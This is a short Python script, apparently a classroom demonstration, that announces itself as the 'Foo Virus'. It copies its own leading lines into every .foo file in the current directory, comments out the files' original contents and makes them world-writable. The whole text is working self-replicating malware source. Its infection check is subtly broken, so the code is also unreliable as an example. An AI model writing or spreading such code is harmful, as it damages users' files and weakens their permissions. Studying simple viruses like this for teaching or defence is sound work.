import sys
import os
import glob

print("\n Hello from Foo Virus....only .foo files will be damaged\n")

IN = open(sys.argv[0] , 'r')
virus = [line for (i,line) in enumerate (IN) if i<37]

for item in glob.glob("*.foo"):
	IN = open(item , 'r')
	all_of_it = IN.readlines()
	IN.close()
	if any(line.find('foovirus') for line in  all_of_it): next
	os.chmod(item , 0o777)
	OUT = open(item , 'w')
	OUT.writelines(virus)
	all_of_it = ['#' + line for line in all_of_it]
	OUT.writelines(all_of_it)
	OUT.close()



